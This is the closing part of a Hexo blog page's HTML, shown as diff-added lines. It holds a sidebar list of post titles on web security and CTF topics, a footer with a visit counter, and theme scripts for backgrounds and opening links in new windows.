class="post-list-item"><a class="post-list-link" href="/2019/09/10/Owasp juice shop(一)/">Owasp juice shop(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/24/PHP代码审计之危险函数/">PHP代码审计之危险函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/22/PHP超级全局变量/">PHP超级全局变量</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/21/一些常见的编码/">一些常见的编码</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/17/命令执行&代码执行漏洞/">命令执行&代码执行漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/12/Web常见的源码泄露/">Web常见的源码泄露</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/09/RSA算法小结/">RSA算法小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/08/PHP反序列化/">PHP反序列化学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/04/i春秋-misc系列/">i春秋-misc系列</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/31/文件上传漏洞总结/">文件上传漏洞总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/28/隐写术/">隐写术</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/25/SQL注入一些过滤及绕过总结/">SQL注入一些过滤及绕过总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/21/SQL简单注入/">SQL简单注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/20/图片隐写/">图片隐写术</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/18/攻防世界——Misc系列/">攻防世界——Misc系列</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/14/Web——爆破wp/">WEB——爆破wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/10/WEB——php大法wp/">WEB——php大法wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/08/图片隐写——小苹果wp/">图片隐写——小苹果wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/10/xss挑战之旅学习笔记/">xss挑战之旅学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/07/xss学习总结/">xxs学习总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/25/SQL注入姿势（3）/">SQL注入姿势（3）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/12/SQL注入姿势（2）/">SQL注入姿势（2）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/10/SQL注入姿势（1）/">SQL注入姿势（1）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/06/PHP学习笔记（5）/">PHP学习笔记（5）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/05/PHP学习笔记（4）/">PHP学习笔记（4）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/28/php登录界面小结/">PHP登录界面小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/25/PHP学习笔记（3）/">PHP学习笔记（3）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/15/PHP学习笔记（2）/">PHP学习笔记（2）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/07/PHP学习笔记（1）/">PHP学习笔记（1）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/05/哈弗曼树/">哈弗曼树</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/27/css学习笔记/">CSS学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/25/HTML学习笔记/">HTML学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/25/MySQL的一些常用命令行总结/">MySQL的一些常用命令行总结</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2021 obsem
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
